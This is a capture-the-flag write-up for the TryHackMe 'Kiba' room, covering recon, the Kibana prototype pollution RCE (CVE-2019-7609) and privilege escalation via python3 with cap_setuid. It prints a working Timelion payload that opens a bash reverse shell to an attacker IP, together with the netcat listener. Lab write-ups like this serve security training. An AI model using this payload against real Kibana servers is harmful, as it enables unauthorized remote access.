<h1 align="center"><a href="https://tryhackme.com/room/kiba">TryHackMe Kiba</a></h1>

<h2 align="center"><a href="https://twitter.com/0xTas">Writeup By: 0xTas</a></h2>

<p align="center">
    <a href="https://tryhackme.com/p/0xTas">
        <img alt="0xTas TryHackMe Profile" src="https://tryhackme-badges.s3.amazonaws.com/0xTas.png"></a>  
</p>


<h3 align="center">15 June 2022</h3>

---

## Description

Identify the critical security flaw in the data visualization dashboard, that allows remote code execution.

---

## Questions

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

Fairly simple question, easy to Google if needed, but I do have a little bit of experience writing server-side Javascript, so to me this sounds like prototype pollution. <br>

Prototype pollution is a vulnerability that takes advantage of the way that objects in languages like Javascript inherit properties and methods from their "prototype" objects. <br>

Prototype pollution occurs when an attacker can inject malicious code to change the properties and methods of the prototype object itself. <br>
In Javascript, there is a property, "\_\_proto\_\_", which can be used to access the prototype object, and potentially alter its methods. <br>
If an attacker can inject malicious code using the \_\_proto\_\_ property, they can redefine the global methods that apply to all instances of that object, thus polluting the namespace with arbitrary code. <br>
It is also possible to alter properties of objects with Prototype Pollution, as long as the specific instance of the target object does not explicity overwrite this property with its own value, which would override the polluted value. <br>


> Answer: Prototype Pollution

---

### What is the version of visualization dashboard installed in the server?

First I ran a typical scan with Nmap: <br>

`tas@kali$ nmap -vv -sV -sC -p- -T4 kiba.thm -oN nmap/full.log` <br>

> 22/tcp   open  ssh          syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) <br>
> 80/tcp   open  http         syn-ack Apache httpd 2.4.18 ((Ubuntu)) <br>
> 5044/tcp open  lxi-evntsvc? syn-ack <br>
> 5601/tcp open  esmagent?    syn-ack <br>

So we're dealing with SSH, a webserver, and a couple of services that I don't recognize right away. <br>

First I visited the homepage of the webserver. It was mostly blank with ASCII art of what looked like a moth or butterfly, and the words "Welcome, 'Linux Capabilities' is very interesting.". <br>

Indeed they are, but this wasn't going to help me right this second. Checking the source, I confirmed that there was nothing else interesting on this index.html page. <br>

I decided to run a Nikto and Gobuster scan on the webserver while I manually checked out those other 5XXX ports. <br>

`tas@kali$ nikto -h http://kiba.thm` <br>

`tas@kali$ gobuster dir -u http://kiba.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

While those scans were running, I tried navigating to the service on port 5044 with my browser, but received a "ERR_CONNECTION_RESET" response. <br>

Next I tried to connect with netcat, but this failed as well: <br>

`tas@kali$ nc -nv $IP 4055` <br>

![Netcat Connection Refused](https://i.imgur.com/aQNNUVI.png)

After this I moved on to checking the service running on port 5601, and it brought me to an actual webpage at '/app/kibana' that appeared to be a dashboard for a product called Kibana. <br>

![Kibana Dashboard](https://i.imgur.com/FKeUOfA.png)

Poking around the dashboard for a little bit, I was able to find a version disclosure on the management tab: <br>

![Kibana Dashboard Version](https://i.imgur.com/8aKKBjh.png)

<details>
    <summary>Kibana Version</summary>

> Answer: Version 6.5.4
</details>

---

### What is the CVE number for this vulnerability?

Searching on Google for "kibana prototype pollution exploit", I was immediately able to indentify the CVE. <br>

<details>
    <summary>CVE Number</summary>

> Answer: CVE-2019-7609
</details>

---

### Compromise the machine and locate user.txt

Following through with my Google search, I read from a couple different resources to learn more about this vulnerability, and how to exploit it. <br>

The vulnerability is in the Timelion Data Visualizer, but also involves the Canvas Workpads module.
Basically, when you load the canvas tab, Kibana attempts to start a new NodeJS process in the background.
This was taken advantage of, but the most direct path to RCE via a "--eval" statement was not allowed, so [the researcher](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) who discovered this exploit had to get creative.
They found that by using prototype pollution in the Timelion visualizer to inject an environment variable containing valid Javascript syntax, they could force NodeJS
to load those environment variables by using the "--require" option instead. 
Since on Linux, the file "/proc/self/environ" contains these environment variables, when the attacker opens the canvas after polluting them with their malicious Javascript code,
the new Node process that spawns would include the malicious environment variable and execute the code within. <br>

Unfortunately, I couldn't get the PoC payload from this researcher's article to function properly in this situation, but I found an [alternative payload on Github](https://github.com/mpgn/CVE-2019-7609). <br>
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.2.2.70/7777 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

So, using the payload with working syntax, I navigated to the Timelion visualizer and pasted it in, making sure to click the "run" button to the right. <br>

![TimeLion Visualizer Payload](https://i.imgur.com/hVfJmWB.png)

Next I made sure to start a netcat listener with bash in my terminal: <br>

`tas@kali$ nc -lnvp 7777` <br>

And then I clicked on the canvas tab in the Kibana Dashboard. <br>

![Kibana Canvas loading with exploit](https://i.imgur.com/NloT6vi.png)

At that moment, I caught a shell on the server: <br>

![Kibana RCE Reverse Shell](https://i.imgur.com/N3I2oyV.png)

I was able to locate user.txt in /home/kiba. <br>

> Answer: THM{1s_**************************}

---

### How would you recursively list capabilities for Linux binaries?

For this question I referenced my notes on Linux enumeration and privilege escalation: <br>

![Linux Capabilities Info](https://i.imgur.com/OmRlh78.png)

<details>
    <summary>List Linux Capabilities</summary>

You can list enabled capabilities with `getcap -r /`. <br>
Running the command without root privileges causes many errors, so you should generally append `2>/dev/null` to suppress them. <br>

> Answer: getcap -r /
</details>

---

### Escalate privileges and obtain root.txt

I ran the command to list interesting capabilities: <br>

![getcap -r / Output](https://i.imgur.com/YbEc7FZ.png)

Right away the python3 entry stood out to me, especially because it was in a folder named ".hackmeplease". <br>

The binary had cap_setuid enabled, so I headed to [GTFOBins](https://gtfobins.github.io/gtfobins/python/) to learn how we might exploit this. <br>

![GTFOBins Python Capabilities](https://i.imgur.com/zlqNwaM.png)

By using the OS module to change the UID of the Python process with `os.setuid(0)`, we can spawn a privileged shell with `os.system`. <br>

I navigated into the .hackmeplease directory, and carried out the escalation process: <br>

![Python Capabilities Privilege Escalation](https://i.imgur.com/wCV2wIR.png)

It worked, and from there I was able to retrieve the flag from root.txt. <br>

> Answer: THM{pr1v1lege_*****************************}

---
